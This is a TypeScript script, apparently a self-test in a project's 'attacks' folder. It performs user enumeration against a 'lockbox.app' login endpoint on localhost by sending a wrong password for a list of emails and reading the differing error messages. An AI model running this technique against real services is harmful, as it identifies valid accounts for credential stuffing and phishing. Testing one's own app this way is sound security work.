// User enumeration: the login tells us which emails exist. We try a list of emails
// with a junk password and read the error text. Run: npx tsx attacks/enum.ts
const BASE = process.env.BASE ?? "http://localhost:8787";
const emails = [
  "asha@lockbox.app", "ravi@lockbox.app", "neha@lockbox.app", "admin@lockbox.app",
  "ceo@lockbox.app", "test@lockbox.app", "root@lockbox.app", "hello@lockbox.app",
  "nobody@lockbox.app", "support@lockbox.app",
];

let found = 0;
for (const email of emails) {
  const r = await fetch(`${BASE}/api/login`, {
    method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ email, password: "wrong-on-purpose" }),
  });
  const { error } = await r.json() as { error: string };
  // v0 says "wrong password" only when the user exists; "no such user" otherwise.
  const exists = r.status === 401 && /wrong password/i.test(error);
  if (exists) found++;
  console.log(`${r.status}  ${exists ? "EXISTS " : "       "} ${email}  (${error})`);
}
console.log(`\nfound ${found} real accounts out of ${emails.length}`);
